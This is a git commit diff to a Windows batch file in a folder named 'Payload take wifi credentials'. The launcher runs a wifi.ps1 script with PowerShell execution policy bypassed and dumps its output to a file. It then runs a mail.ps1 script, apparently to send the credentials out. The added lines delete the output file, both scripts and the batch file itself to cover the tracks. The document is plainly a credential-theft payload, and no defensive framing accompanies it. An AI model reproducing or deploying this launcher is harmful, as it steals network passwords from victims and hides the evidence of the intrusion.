904627c559e7959c51ee4d3e0b113dd9c34d12ce
RevoVog <vihanga.vog@gmail.com>
2025-09-03 00:36:48 +0530

    Updated running payload

--- Payload take wifi credentials/run.cmd
+++ Payload take wifi credentials/run.cmd
@@ -2,3 +2,10 @@
 powershell.exe -ExecutionPolicy Bypass -File "wifi.ps1" > output.txt
 TIMEOUT /T 5
 powershell.exe -ExecutionPolicy Bypass -File "mail.ps1"
+TIMEOUT /T 5
+del output.txt
+del wifi.ps1
+del mail.ps1
+(
+    start "" cmd /c del "%~f0"
+)
